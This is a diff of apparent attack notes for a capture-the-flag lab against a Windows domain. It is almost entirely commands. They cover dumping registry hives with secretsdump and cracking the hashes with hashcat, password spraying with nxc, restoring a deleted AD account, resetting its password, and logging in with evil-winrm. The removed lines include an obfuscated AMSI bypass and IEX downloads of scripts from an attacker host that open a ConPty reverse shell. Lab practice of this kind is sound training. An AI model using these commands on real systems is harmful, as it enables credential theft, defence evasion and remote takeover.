@@ -117,7 +117,10 @@ python3 vol.py -f ~/MEMORY.DMP windows.registry.hivelist --filter '\REGISTRY\MAC
 python3 vol.py -f ~/MEMORY.DMP windows.registry.hivelist --filter '\SystemRoot\System32\Config\SECURITY' --dump  
 python3 vol.py -f ~/MEMORY.DMP windows.registry.hivelist --filter '\SystemRoot\System32\Config\SAM' --dump
 ==========(18)======================================================================================================================
-secretsdump.py -sam registry.SAM.0xd3067d935000.hive -security registry.SECURITY.0xd3067d7f0000.hive -system registry.SYSTEM.0xd30679c46000.hive LOCAL
+secretsdump.py -sam registry.SAM.0xd3067d935000.hive -security registry.SECURITY.0xd3067d7f0000.hive -system registry.SYSTEM.0xd30679c46000.hive LOCAL\
+
+hashcat -a 0 -m 2100 hash.txt
+hashcat -m 2100 --show hash.txt
 ==========(19)======================================================================================================================
 //synchronize time with remote server
 sudo ntpdate freelancer.htb
@@ -130,9 +133,29 @@ nxc ldap 10.10.11.5 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -
 ==========(21)======================================================================================================================
 evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'
 
-Get-ADObject -filter 'isDeleted -eq $true -includeDeletedObjects -Properties * | select samaccountname, memberof, userprincipalname
+Get-ADObject -filter 'isDeleted -eq$true' -includeDeletedObjects -Properties * | select samaccountname, memberof, userprincipalname
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects
 
-:\> [Ref]."A`ss`Embly"."GET`TY`Pe"($(('76 5c 56 51 40 48 0b 68 44 4b 44 42 40 48 40 4b 51 0b 64 50 51 4a 48 44 51 4c 4a 4b 0b 64 48 56 4c 70 51 4c 49 56'.Split(' ')|ForEach{[char](([convert]::ToInt16($_, 16)-bxor 0x25))})-join '')).GetField($(('44 48 56 4c 6c 4b 4c 51 63 44 4c 49 40 41'.Split(' ')|ForEach{[char](([convert]::ToInt16($_, 16)-bxor 0x25))})-join ''),$('NonPublic,Static')).SetValue($null,$true)
-C:\> IEX(IWR http://10.10.14.185:8000/NETAMSI.ps1 -UseBasicParsing)
-C:\> IEX(IWR http://10.10.14.185:8000/ConPtyReflect.ps1 -UseBasicParsing)
-C:\> Invoke-ConPtyReflect 10.10.14.185 9001
+restore-ADObject -identity 'ebe15df5-e265-45ec-b7fc-359877217138' -newname "liza.old"
+get-aduser -filter * | where name -eq "liza.old"
+nxc smb freelancer.htb -u liza.kazanof -p passwords.list -d freelancer.htb
+smbpasswd.py freelancer.htb/liza.kazanof:'RockYou!'@freelancer.htb -newpass 'Password123!'
+nxc smb freelancer.htb -u liza.kazanof -p 'Password123!' -d freelancer.htb
+nxc winrm freelancer.htb -u liza.kazanof -p 'Password123!' -d freelancer.htb
+evil-winrm -i freelancer.htb -u liza.kazanof -p 'Passw0rd!'
+whoami /groups
+
+/*
+//also same
+get-adobject -filter 'isdeleted -eq $true' -includedeletedobjects
+get-adobject -filter 'isdeleted -eq $true -and ObjectClass -eq "user"' -includedeletedobjects -property *
+restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138
+restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138 -newname liza.kazanof.new
+
+get-aduser -filter * | select samaccountname
+get-aduser -filter 'SamAccountName -eq "liza.kazanof"'
+netexec smb freelancer.htb -u liza.kazanof -p 'RockYou!'
+changepasswd.py 'freelancer.htb/liza.kazanof:RockYou!@freelancer.htb' -newpass 'Password123'
+evil-winrm -i freelancer.htb -u liza.kazanof -p 'Pasword123!'
+*/
+==========(22)======================================================================================================================
